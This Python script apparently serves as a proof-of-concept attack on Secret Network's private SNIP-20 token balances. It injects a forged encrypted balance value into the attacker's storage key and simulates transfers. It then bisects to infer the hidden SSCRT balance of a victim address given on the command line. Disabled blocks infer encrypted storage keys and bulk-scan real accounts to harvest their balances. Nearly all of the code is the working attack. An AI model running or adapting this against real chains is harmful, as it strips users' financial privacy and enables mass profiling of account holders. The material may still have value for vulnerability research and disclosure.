import time
import json
import tempfile
import os
import sys
import random, glob, pickle

from utils import query_native, query_contract, get_codehash, generate_and_sign_tx, generate_and_sign_transfer, simulate_tx
from utils import set_snapshot, clear_snapshot, clear_outputs
from params_main import SECRETD, ATTACK_DIR, TOKENS, BAL_KEYS

UNIQUE_LABEL=str(time.time())

ACC0='secret1yhj0m3g8qramjjtv7g6quaqzdj77wwls4l555q'
ACC1='secret1uh83vxunp4jrnm47744wkzur5cfsfar959c74v'

SSCRT=TOKENS['SSCRT']['addr']

VICTIM="secret1klkjyu278c72rcwe46el769vgv4vdqjrcg5533"

SSCRT_HASH = get_codehash(SSCRT)



class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def writelines(self, datas):
        self.stream.writelines(datas)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)
sys.stdout = Unbuffered(sys.stdout)


def probe_victim(victim, amt):
    # Returns True if the victim has (bal[victim] < amt)
    snapname = f"{UNIQUE_LABEL}_probe_victim_{time.time()}"
    # print(snapname)
    clear_outputs()
    set_snapshot(snapname)
    open(f"{ATTACK_DIR}/adv_key",'w').write(BAL_KEYS['SSCRT'][ACC0])
    open(f"{ATTACK_DIR}/adv_value","w").write(BOOST)
    tx = generate_and_sign_transfer(SSCRT,ACC0,victim,2**128-1-amt)
    r = simulate_tx(tx)
    clear_snapshot(snapname)
    return r

def bisect_victim(victim, lo=0, hi=2**128-1):
    # Base case:    
    if lo+1000000 >= hi: return lo
    # Probe the middle
    print("[Bisecting balance] lo:", lo, "hi:", hi)
    mid = (lo+hi)//2
    if probe_victim(victim, mid):
        return bisect_victim(victim, lo, mid)
    else:
        return bisect_victim(victim, mid, hi)

def search_victim(victim):
    print('Inferring the SSCRT balance of', victim)
    if probe_victim(victim, 1): return 0
    hi = 1000000
    while True:
        print('probing upwards with hi:', hi)
        if probe_victim(victim, hi): break
        hi *= 2
    return bisect_victim(victim, lo=1, hi=hi)
    

def infer_key(sender,addr):
    _clear_kvstore()
    # First time is just in case they have a 0 balance to start with
    tx = generate_and_sign_transfer(SSCRT,sender,addr,1)
    simulate_tx(tx)
    _clear_kvstore()
    # Second time is to determine the value
    tx = generate_and_sign_transfer(SSCRT,sender,addr,1)
    assert(simulate_tx(tx))
    # print('[Transfer] sender:', sender, 'receiver:', addr)
    items = lastsim_kvstore()
    sender_k = items[1][0]
    if sender == addr:
        receiver_k = items[1][0]
    else:
        receiver_k = items[2][0]
    # print('Success:', success, 'Sender:', sender_k, 'Receiver:', receiver_k)
    return receiver_k


if 0:
    """The first time we explore a new SNIP-20 token, we 
       need to determine the encrypted fieldnames for the attacker
       balances.
    """
    set_snapshot(f"{UNIQUE_LABEL}_infer")
    clear_outputs()
    balance_ks = {}
    balance_ks[ACC0]   = infer_key(ACC0,ACC0)
    balance_ks[ACC1]   = infer_key(ACC0,ACC1)
    balance_ks[VICTIM] = infer_key(ACC0,VICTIM)
    print(balance_ks)
    clear_snapshot(f"{UNIQUE_LABEL}_infer")


# This is the encrypted value for SSCRT balance of
#    ACC0,   value  2**128-1, max represntible
BOOST="d782b7b17349f894b86225ac4dc640c95e27b10b7e9b66d1eda85e9d630c0d3c964c1ae5b70e02c8799d7d5826fe4b81f5cf7f64b1779108a9646c98e786ddeb"

if 1:
    victim = sys.argv[1]
    res = search_victim(victim)
    print(f"At height 7398785 2023-02-08T13:02:46.096559771Z")
    print(f"Address {victim} has {res/1e6} SSCRT to within about 1.0 SCRT")

if 0:
    set_snapshot(f"{UNIQUE_LABEL}_check")
    tx = generate_and_sign_transfer(SSCRT,ACC0,ACC)
    clear_snapshot(f"{UNIQUE_LABEL}_check")

if 0:
    if 1:
        accounts = {}
        for pkl in glob.glob('accounts/pkl_*.pkl'):
            acc = pickle.load(open(pkl,'rb'))
            accounts.update(acc)
        for k,v in [(k,v["sscrt"]) for k,v in accounts.items()]:
            if v:
                print(k,float(v)/1e6)
    else:
      for accf in glob.glob("accounts/accounts_*")[:5]:
        obj = json.load(open(accf))
        accounts = {}
        for item in obj["accounts"][:100]:
            address = item["address"]
            bal = json.loads(query_native(item['address']))['balances']
            balance = int(bal[0]["amount"]) if bal else 0
            sscrt_bal = search_victim(address)
            print("address:", address, "balance:", balance,
                  "sscrt:", sscrt_bal)
            accounts[address] = {"scrt":balance,"sscrt":sscrt_bal}
        pickle.dump(accounts, open(f"accounts/pkl_{accf[-5:]}.pkl",'wb'))
        
